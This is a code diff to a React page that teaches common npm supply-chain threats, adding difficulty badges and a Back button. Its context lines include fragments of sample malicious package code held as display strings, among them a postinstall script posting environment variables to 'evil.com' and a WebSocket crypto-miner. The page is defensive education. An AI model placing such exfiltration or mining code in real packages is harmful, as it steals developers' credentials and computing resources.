@@ -1,7 +1,8 @@
 import { useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
-import { AlertTriangle, GitFork, FileText, UserX, Package } from "lucide-react";
+import { Badge } from "@/components/ui/badge";
+import { AlertTriangle, GitFork, FileText, UserX, Package, ArrowLeft } from "lucide-react";
 
 const SupplyChainInfo = () => {
   const navigate = useNavigate();
@@ -13,6 +14,7 @@ const SupplyChainInfo = () => {
       description: "Packages deliberately created to steal data or compromise systems.",
       example: "A package that exfiltrates environment variables containing API keys and credentials to a remote server.",
       color: "text-destructive",
+      difficulty: "medium",
       code: `// postinstall.js
 const https = require('https');
 
@@ -34,6 +36,7 @@ https.request('https://evil.com/collect', {
       description: "Malicious packages with names similar to popular legitimate packages.",
       example: "Publishing 'reaqct' or 'lodas' to trick developers into installing the wrong package.",
       color: "text-orange-500",
+      difficulty: "easy",
       code: `// Package: "reaqct" (looks like "react")
 // index.js
 module.exports = {
@@ -53,6 +56,7 @@ module.exports = {
       description: "Injecting malicious code into legitimate package dependencies.",
       example: "A trusted package's dependency gets compromised, affecting all projects using it.",
       color: "text-yellow-600",
+      difficulty: "hard",
       code: `// Previously safe utility package
 // Now compromised in v2.0.1
 module.exports = {
@@ -74,6 +78,7 @@ module.exports = {
       description: "Attackers gain access to legitimate maintainer accounts to push malicious updates.",
       example: "A maintainer's npm account is hijacked, and malicious code is pushed as a trusted update.",
       color: "text-red-500",
+      difficulty: "medium",
       code: `// Added to popular package's v3.2.1 by attacker
 // index.js (new code inserted)
 if (process.env.NODE_ENV === 'production') {
@@ -92,6 +97,7 @@ if (process.env.NODE_ENV === 'production') {
       description: "Previously safe packages that introduce malicious code in later versions.",
       example: "A popular package introduces cryptocurrency mining code in version 2.0.0.",
       color: "text-purple-500",
+      difficulty: "hard",
       code: `// Version 1.x was clean
 // Version 2.0.0 adds:
 const WebSocket = require('ws');
@@ -108,9 +114,34 @@ init();`
     }
   ];
 
+  const getDifficultyColor = (difficulty: string) => {
+    switch (difficulty) {
+      case "easy":
+        return "bg-green-500/20 text-green-500 border-green-500/30";
+      case "medium":
+        return "bg-yellow-500/20 text-yellow-500 border-yellow-500/30";
+      case "hard":
+        return "bg-red-500/20 text-red-500 border-red-500/30";
+      default:
+        return "";
+    }
+  };
+
   return (
     <div className="min-h-screen bg-gradient-to-br from-background via-background to-accent/20 flex flex-col items-center justify-center p-4">
       <div className="w-full max-w-6xl space-y-8 animate-fade-in">
+        <div className="flex items-center justify-between">
+          <Button 
+            variant="ghost" 
+            size="sm" 
+            onClick={() => navigate("/")}
+            className="gap-2"
+          >
+            <ArrowLeft className="w-4 h-4" />
+            Back
+          </Button>
+        </div>
+        
         <div className="text-center space-y-4">
           <h1 className="text-4xl md:text-5xl font-bold bg-gradient-to-r from-primary via-primary/80 to-primary/60 bg-clip-text text-transparent">
             Common npm Supply Chain Threats
@@ -129,7 +160,12 @@ init();`
                   <div className="flex items-start gap-3">
                     <Icon className={`w-6 h-6 ${threat.color} mt-1 flex-shrink-0`} />
                     <div className="space-y-1 flex-1">
-                      <CardTitle className="text-xl">{threat.title}</CardTitle>
+                      <div className="flex items-center gap-2 flex-wrap">
+                        <CardTitle className="text-xl">{threat.title}</CardTitle>
+                        <Badge variant="outline" className={getDifficultyColor(threat.difficulty)}>
+                          {threat.difficulty}
+                        </Badge>
+                      </div>
                       <CardDescription className="text-sm">
                         {threat.description}
                       </CardDescription>
